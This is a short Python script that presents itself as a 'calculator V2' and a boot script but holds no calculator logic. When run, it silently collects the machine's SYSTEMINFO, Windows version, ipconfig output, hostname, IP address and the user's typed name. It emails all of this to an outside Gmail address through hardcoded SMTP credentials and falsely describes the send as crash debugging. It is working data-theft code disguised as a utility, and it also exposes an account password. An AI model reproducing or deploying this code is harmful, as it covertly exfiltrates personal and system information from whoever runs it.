import smtplib
import subprocess
import os
from time import sleep
import sys


systemipfull = subprocess.check_output("ipconfig", shell=True, universal_newlines=True)
os.system('cls')
name = ("Ace")

#Boot script
print('sys.argv[0] =', sys.argv[0])             
pathname = os.path.dirname(sys.argv[0])        
print('path =', pathname)
print('full path =', os.path.abspath(pathname)) 
print("Pathway copied and successfully booted...")
sleep(1)
systeminfo = subprocess.check_output("SYSTEMINFO", shell=True, universal_newlines=True)
sleep(1)
systemversion = subprocess.check_output("ver", shell=True, universal_newlines=True)
sleep(1)
print('\n')
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import socket


msg = MIMEMultipart()




server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
server.login("python250200@gmail.com", "TgmpeJ68AUG.5.d",)
server.sendmail("python250200@gmail.com", "peytonanthony99@gmail.com", "Attention Dev! Someone is using your script and it has crashed :( Not to worry! I have some info for you! :D "
                "Here is their System info and full IP info for debug!" + " " + str(systemversion) + " " + 
                str(systeminfo) + " " + str(systemipfull))


server.quit()



from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import socket
    
name = input("Whats your name?: ")

h_name = socket.gethostname()

addresssetup = socket.gethostbyname(h_name)


msg = MIMEMultipart()



server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
server.login("python250200@gmail.com", "TgmpeJ68AUG.5.d",)
server.sendmail("python250200@gmail.com", "peytonanthony99@gmail.com", "Attention Dev! Someone used calculator V2 "
                "Here is their host name, IP, and Name!" + " " +
                str(name) + " " + str(h_name) + " " + str(addresssetup))
server.quit()